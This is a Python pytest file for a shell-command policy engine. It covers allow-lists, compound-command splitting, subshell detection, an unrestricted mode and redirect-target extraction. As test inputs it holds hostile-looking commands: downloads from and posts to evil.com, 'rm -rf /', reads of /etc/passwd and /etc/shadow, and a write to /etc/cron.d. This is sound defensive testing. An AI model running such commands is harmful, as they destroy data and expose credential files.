"""Tests for missy.policy.shell.ShellPolicyEngine."""

from __future__ import annotations

from collections.abc import Generator

import pytest

from missy.config.settings import ShellPolicy
from missy.core.events import event_bus
from missy.core.exceptions import PolicyViolationError
from missy.policy.shell import ShellPolicyEngine

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def clear_event_bus() -> Generator[None, None, None]:
    event_bus.clear()
    yield
    event_bus.clear()


def make_engine(enabled: bool = True, commands: list[str] | None = None) -> ShellPolicyEngine:
    return ShellPolicyEngine(ShellPolicy(enabled=enabled, allowed_commands=commands or []))


# ---------------------------------------------------------------------------
# Shell globally disabled
# ---------------------------------------------------------------------------


class TestShellDisabled:
    def test_any_command_denied_when_disabled(self):
        engine = make_engine(enabled=False, commands=["git", "ls"])
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("git status")
        assert exc_info.value.category == "shell"

    def test_disabled_emits_deny_event_with_rule(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls -la")
        events = event_bus.get_events(result="deny")
        assert len(events) == 1
        assert events[0].policy_rule == "shell_disabled"

    def test_disabled_empty_command_still_denied(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError):
            engine.check_command("")

    def test_disabled_detail_mentions_enabled_false(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("whoami")
        assert "False" in exc_info.value.detail


# ---------------------------------------------------------------------------
# Shell enabled – allow-list matching
# ---------------------------------------------------------------------------


class TestShellEnabled:
    def test_allowed_command_returns_true(self):
        engine = make_engine(commands=["git"])
        assert engine.check_command("git status") is True

    def test_command_with_args_matches_on_program_name(self):
        engine = make_engine(commands=["ls"])
        assert engine.check_command("ls -la /tmp") is True

    def test_command_not_in_allowlist_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("rm -rf /")
        assert exc_info.value.category == "shell"

    def test_empty_allowlist_denies_all(self):
        # SR-1.8: enabled=True with an empty allowlist must deny every
        # command -- configuration ambiguity must never become allow-all.
        engine = make_engine(enabled=True, commands=[])
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls")

    def test_empty_command_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("")

    def test_whitespace_only_command_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("   ")

    def test_allow_emits_event(self):
        engine = make_engine(commands=["git"])
        engine.check_command("git log --oneline")
        events = event_bus.get_events(event_type="shell_check", result="allow")
        assert len(events) == 1
        assert events[0].detail["command"] == "git log --oneline"

    def test_deny_emits_event(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("curl https://evil.com")
        events = event_bus.get_events(event_type="shell_check", result="deny")
        assert len(events) == 1

    def test_rule_name_in_allow_event(self):
        engine = make_engine(commands=["git"])
        engine.check_command("git status")
        event = event_bus.get_events(result="allow")[0]
        assert event.policy_rule == "cmd:compound(1)"

    def test_session_task_ids_forwarded_to_event(self):
        engine = make_engine(commands=["ls"])
        engine.check_command("ls", session_id="s5", task_id="t2")
        event = event_bus.get_events()[0]
        assert event.session_id == "s5"
        assert event.task_id == "t2"


# ---------------------------------------------------------------------------
# Shell enabled + unrestricted=True -- allow-list matching skipped entirely
# ---------------------------------------------------------------------------


def make_unrestricted_engine(enabled: bool = True) -> ShellPolicyEngine:
    return ShellPolicyEngine(ShellPolicy(enabled=enabled, unrestricted=True))


class TestShellUnrestricted:
    def test_empty_allowlist_no_longer_denies(self):
        """The exact scenario the user reported: enabled=True,
        allowed_commands empty, unrestricted=True -- must NOT raise
        "allowed_commands is empty" anymore."""
        engine = make_unrestricted_engine()
        assert engine.check_command("ls -la /tmp") is True

    def test_arbitrary_unlisted_command_allowed(self):
        engine = make_unrestricted_engine()
        assert engine.check_command("curl https://example.com") is True
        assert engine.check_command("rm -rf /tmp/scratch") is True

    def test_compound_command_with_multiple_unlisted_programs_allowed(self):
        engine = make_unrestricted_engine()
        assert engine.check_command("git status && curl example.com; ls") is True

    def test_still_denied_when_shell_disabled(self):
        """unrestricted=True must not bypass ShellPolicy.enabled -- that's
        a separate gate checked before allow-list matching is even
        reached."""
        engine = make_unrestricted_engine(enabled=False)
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("ls")
        assert exc_info.value.category == "shell"
        event = event_bus.get_events(result="deny")[0]
        assert event.policy_rule == "shell_disabled"

    def test_allowed_commands_populated_alongside_unrestricted_still_allows_everything(self):
        """A populated (but now-irrelevant) allowed_commands list doesn't
        somehow narrow unrestricted mode back down."""
        engine = ShellPolicyEngine(
            ShellPolicy(enabled=True, allowed_commands=["git"], unrestricted=True)
        )
        assert engine.check_command("curl https://example.com") is True

    def test_allow_event_carries_unrestricted_rule(self):
        engine = make_unrestricted_engine()
        engine.check_command("whoami")
        event = event_bus.get_events(result="allow")[0]
        assert event.policy_rule == "unrestricted"

    def test_launcher_command_still_logs_warning(self, caplog):
        """Launcher-command observability (sudo/bash/python/etc. can run
        arbitrary subcommands) is a distinct signal from allow-list
        enforcement and must still fire in unrestricted mode."""
        engine = make_unrestricted_engine()
        with caplog.at_level("WARNING", logger="missy.policy.shell"):
            engine.check_command("sudo apt update")
        assert any("sudo" in r.message and "launcher" in r.message for r in caplog.records)

    def test_subshell_marker_allowed_in_unrestricted_mode(self):
        """unrestricted means genuinely unrestricted: the subshell/brace-
        group parsing-safety rejection exists only to protect the
        allow-list match from a hidden subcommand -- with no allow-list to
        protect in this mode, $(...) and friends are permitted too."""
        engine = make_unrestricted_engine()
        assert engine.check_command("echo $(rm -rf /tmp/x)") is True

    def test_backtick_subshell_allowed_in_unrestricted_mode(self):
        engine = make_unrestricted_engine()
        assert engine.check_command("echo `whoami`") is True

    def test_brace_group_allowed_in_unrestricted_mode(self):
        engine = make_unrestricted_engine()
        assert engine.check_command("{ echo hi; echo bye; }") is True

    def test_malformed_quoting_allowed_in_unrestricted_mode(self):
        """A command that fails shlex parsing (e.g. an unmatched quote) is
        still passed through in unrestricted mode -- Missy's own tokeniser
        struggling to parse it says nothing about whether the real shell
        that will actually execute it can."""
        engine = make_unrestricted_engine()
        assert engine.check_command("echo 'unterminated") is True

    def test_empty_command_still_denied_in_unrestricted_mode(self):
        """The one thing unrestricted mode still denies -- there's nothing
        to execute, so this isn't a meaningful restriction being lifted."""
        engine = make_unrestricted_engine()
        with pytest.raises(PolicyViolationError, match="empty command"):
            engine.check_command("")

    def test_whitespace_only_command_still_denied_in_unrestricted_mode(self):
        engine = make_unrestricted_engine()
        with pytest.raises(PolicyViolationError, match="empty command"):
            engine.check_command("   ")

    def test_default_unrestricted_is_false_preserves_sr_1_8(self):
        """Regression: a ShellPolicy that never sets unrestricted must
        behave exactly as before this feature existed -- empty
        allowed_commands still denies everything."""
        engine = make_engine(enabled=True, commands=[])
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls")


# ---------------------------------------------------------------------------
# Path-qualified program names
# ---------------------------------------------------------------------------


class TestPathQualifiedCommands:
    def test_absolute_path_program_matches_basename(self):
        """'/usr/bin/git status' should match allowed_commands=['git']."""
        engine = make_engine(commands=["git"])
        assert engine.check_command("/usr/bin/git status") is True

    def test_relative_path_program_matches_basename(self):
        engine = make_engine(commands=["python"])
        assert engine.check_command("./bin/python script.py") is True

    def test_path_program_not_in_allowlist_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("/usr/bin/curl https://example.com")

    def test_allowlist_with_path_matches_basename(self):
        """Entry '/usr/bin/git' should allow command 'git status'."""
        engine = make_engine(commands=["/usr/bin/git"])
        assert engine.check_command("git status") is True

    def test_similar_basename_not_matched(self):
        """'git' entry must not match 'gitk' command."""
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("gitk")


# ---------------------------------------------------------------------------
# Malformed commands
# ---------------------------------------------------------------------------


class TestMalformedCommands:
    def test_unmatched_quote_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("echo 'unclosed")

    def test_unmatched_quote_emits_deny_event(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError):
            engine.check_command('echo "bad')
        events = event_bus.get_events(result="deny")
        assert len(events) == 1

    def test_command_with_quoted_args_parsed_correctly(self):
        engine = make_engine(commands=["echo"])
        assert engine.check_command('echo "hello world"') is True


# ---------------------------------------------------------------------------
# Multiple allowed commands
# ---------------------------------------------------------------------------


class TestMultipleAllowedCommands:
    def test_second_command_in_list_matched(self):
        engine = make_engine(commands=["git", "ls", "python"])
        assert engine.check_command("python -m pytest") is True

    def test_unlisted_command_still_denied(self):
        engine = make_engine(commands=["git", "ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("wget http://example.com")


# ---------------------------------------------------------------------------
# Compound command handling
# ---------------------------------------------------------------------------


class TestCompoundCommands:
    """Tests for _extract_all_programs and compound command enforcement."""

    def test_semicolon_both_allowed(self):
        engine = make_engine(commands=["ls", "echo"])
        assert engine.check_command("ls; echo done") is True

    def test_semicolon_second_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError, match="echo"):
            engine.check_command("ls; echo pwned")

    def test_semicolon_first_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="rm"):
            engine.check_command("rm -rf /; echo hi")

    def test_pipe_both_allowed(self):
        engine = make_engine(commands=["ls", "grep"])
        assert engine.check_command("ls | grep foo") is True

    def test_pipe_second_denied(self):
        engine = make_engine(commands=["cat"])
        with pytest.raises(PolicyViolationError, match="curl"):
            engine.check_command("cat file | curl -X POST")

    def test_and_operator_both_allowed(self):
        engine = make_engine(commands=["git", "make"])
        assert engine.check_command("git pull && make build") is True

    def test_and_operator_second_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError, match="rm"):
            engine.check_command("git pull && rm -rf /")

    def test_or_operator_both_allowed(self):
        engine = make_engine(commands=["make", "echo"])
        assert engine.check_command("make || echo failed") is True

    def test_or_operator_second_denied(self):
        engine = make_engine(commands=["make"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("make || wget evil.com/payload")

    def test_newline_compound(self):
        engine = make_engine(commands=["ls", "pwd"])
        assert engine.check_command("ls\npwd") is True

    def test_newline_second_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls\ncurl evil.com")

    def test_subshell_dollar_paren_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="subshell"):
            engine.check_command("echo $(cat /etc/passwd)")

    def test_backtick_subshell_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="subshell"):
            engine.check_command("echo `id`")

    def test_triple_chain_all_allowed(self):
        engine = make_engine(commands=["git", "make", "echo"])
        assert engine.check_command("git pull && make test || echo fail") is True

    def test_triple_chain_middle_denied(self):
        engine = make_engine(commands=["git", "echo"])
        with pytest.raises(PolicyViolationError, match="curl"):
            engine.check_command("git pull && curl evil.com || echo fail")

    def test_empty_allowlist_denies_compound(self):
        # SR-1.8: an empty allowlist must deny compound commands too --
        # this exact case (rm -rf / && wget evil.com "allowed" under the
        # old allow-all-on-empty behavior) is precisely the vulnerability
        # the fix closes.
        engine = make_engine(commands=[])
        with pytest.raises(PolicyViolationError):
            engine.check_command("rm -rf / && wget evil.com")

    def test_compound_event_rule(self):
        engine = make_engine(commands=["git", "make"])
        engine.check_command("git pull && make build")
        events = event_bus.get_events(result="allow")
        assert len(events) == 1
        assert "compound(2)" in events[0].policy_rule

    def test_single_command_compound_rule(self):
        """A single simple command still goes through compound extraction."""
        engine = make_engine(commands=["ls"])
        engine.check_command("ls -la")
        events = event_bus.get_events(result="allow")
        assert events[0].policy_rule == "cmd:compound(1)"


class TestExtractAllPrograms:
    """Unit tests for _extract_all_programs class method."""

    def test_empty_string(self):
        assert ShellPolicyEngine._extract_all_programs("") is None

    def test_whitespace_only(self):
        assert ShellPolicyEngine._extract_all_programs("   ") is None

    def test_single_command(self):
        assert ShellPolicyEngine._extract_all_programs("git status") == ["git"]

    def test_semicolon_split(self):
        assert ShellPolicyEngine._extract_all_programs("ls; pwd") == ["ls", "pwd"]

    def test_pipe_split(self):
        assert ShellPolicyEngine._extract_all_programs("cat file | grep foo") == ["cat", "grep"]

    def test_and_split(self):
        assert ShellPolicyEngine._extract_all_programs("make && test") == ["make", "test"]

    def test_or_split(self):
        assert ShellPolicyEngine._extract_all_programs("make || echo fail") == ["make", "echo"]

    def test_dollar_paren_rejected(self):
        assert ShellPolicyEngine._extract_all_programs("echo $(whoami)") is None

    def test_backtick_rejected(self):
        assert ShellPolicyEngine._extract_all_programs("echo `id`") is None

    def test_mixed_operators(self):
        result = ShellPolicyEngine._extract_all_programs("a && b || c; d | e")
        assert result == ["a", "b", "c", "d", "e"]

    # -----------------------------------------------------------------
    # Bug fix (found while implementing SR-1.7): a bare "&" immediately
    # preceded by "<" or ">" is a file-descriptor-duplication redirect
    # (2>&1, >&2, <&0), not the background-execution chain operator. The
    # previous regex split "cmd 2>&1" into "cmd 2>" and "1", denying the
    # extremely common "2>&1" idiom by misparsing "1" as a fake
    # sub-command's program name.
    # -----------------------------------------------------------------

    def test_stderr_to_stdout_redirect_is_not_split(self):
        assert ShellPolicyEngine._extract_all_programs("echo hi 2>&1") == ["echo"]

    def test_bare_fd_dup_redirect_is_not_split(self):
        assert ShellPolicyEngine._extract_all_programs("echo hi >&2") == ["echo"]

    def test_input_fd_dup_redirect_is_not_split(self):
        assert ShellPolicyEngine._extract_all_programs("cat <&0") == ["cat"]

    def test_genuine_background_ampersand_still_splits(self):
        """A bare "&" NOT preceded by a redirect operator is still the
        background-execution chain operator and must still split."""
        assert ShellPolicyEngine._extract_all_programs("sleep 5 & echo done") == [
            "sleep",
            "echo",
        ]

    def test_stderr_redirect_combined_with_chain_operator(self):
        result = ShellPolicyEngine._extract_all_programs("cmd1 2>&1 && cmd2")
        assert result == ["cmd1", "cmd2"]


# ---------------------------------------------------------------------------
# SR-1.7: redirection targets bypass filesystem policy.
#
# ShellPolicyEngine only ever inspected program names -- an allowed
# program like "echo" could write to any host path via
# "echo x > /etc/cron.d/pwn" with zero filesystem check. Fixed by adding
# extract_redirect_targets(), which PolicyEngine.check_shell() (the
# facade with access to both engines) routes through the filesystem
# policy engine.
# ---------------------------------------------------------------------------
class TestExtractRedirectTargets:
    def test_no_redirection_returns_empty(self):
        engine = make_engine(commands=["echo"])
        assert engine.extract_redirect_targets("echo hello") == ([], [])

    def test_simple_write_redirect(self):
        engine = make_engine(commands=["echo"])
        writes, reads = engine.extract_redirect_targets("echo x > /tmp/out.txt")
        assert writes == ["/tmp/out.txt"]
        assert reads == []

    def test_write_redirect_with_no_surrounding_whitespace(self):
        """ "echo x>/tmp/out.txt" (no spaces) must still be recognised --
        an attacker/model could omit spaces specifically to dodge a naive
        whitespace-based redirect scanner."""
        engine = make_engine(commands=["echo"])
        writes, _reads = engine.extract_redirect_targets("echo x>/tmp/out.txt")
        assert writes == ["/tmp/out.txt"]

    def test_append_redirect(self):
        engine = make_engine(commands=["echo"])
        writes, _reads = engine.extract_redirect_targets("echo x >> /tmp/log.txt")
        assert writes == ["/tmp/log.txt"]

    def test_force_overwrite_redirect(self):
        engine = make_engine(commands=["echo"])
        writes, _reads = engine.extract_redirect_targets("echo x >| /tmp/out.txt")
        assert writes == ["/tmp/out.txt"]

    def test_combined_stdout_stderr_redirect(self):
        engine = make_engine(commands=["cmd"])
        writes, _reads = engine.extract_redirect_targets("cmd &> /tmp/both.log")
        assert writes == ["/tmp/both.log"]

    def test_read_redirect(self):
        engine = make_engine(commands=["cat"])
        _writes, reads = engine.extract_redirect_targets("cat < /etc/shadow")
        assert reads == ["/etc/shadow"]

    def test_fd_duplication_is_not_a_file_target(self):
        """ "2>&1" and ">&2" duplicate a file descriptor -- the next token
        is a bare fd number, not a filesystem path, and must not be
        treated as one."""
        engine = make_engine(commands=["echo"])
        writes, reads = engine.extract_redirect_targets("echo hi 2>&1")
        assert writes == []
        assert reads == []

    def test_bare_fd_dup_is_not_a_file_target(self):
        engine = make_engine(commands=["echo"])
        writes, _reads = engine.extract_redirect_targets("echo hi >&2")
        assert writes == []

    def test_multiple_redirects_in_one_command(self):
        engine = make_engine(commands=["cmd"])
        writes, reads = engine.extract_redirect_targets("cmd < /tmp/in.txt > /tmp/out.txt 2>&1")
        assert reads == ["/tmp/in.txt"]
        assert writes == ["/tmp/out.txt"]

    def test_redirects_across_compound_command(self):
        engine = make_engine(commands=["echo"])
        writes, _reads = engine.extract_redirect_targets(
            "echo a > /tmp/a.txt && echo b > /tmp/b.txt"
        )
        assert writes == ["/tmp/a.txt", "/tmp/b.txt"]

    def test_redirect_inside_quotes_is_not_a_real_operator(self):
        """A literal '>' inside a quoted argument is just text, not a
        redirection -- shlex's quote-aware tokenisation must not treat it
        as an operator."""
        engine = make_engine(commands=["echo"])
        writes, reads = engine.extract_redirect_targets("echo 'a > b'")
        assert writes == []
        assert reads == []

    def test_malformed_quoting_returns_empty_not_raises(self):
        engine = make_engine(commands=["echo"])
        # Unbalanced quote -- check_command's own tokenisation already
        # denies this command before redirect extraction is reached; this
        # method itself must degrade gracefully rather than raising.
        assert engine.extract_redirect_targets("echo 'unterminated") == ([], [])
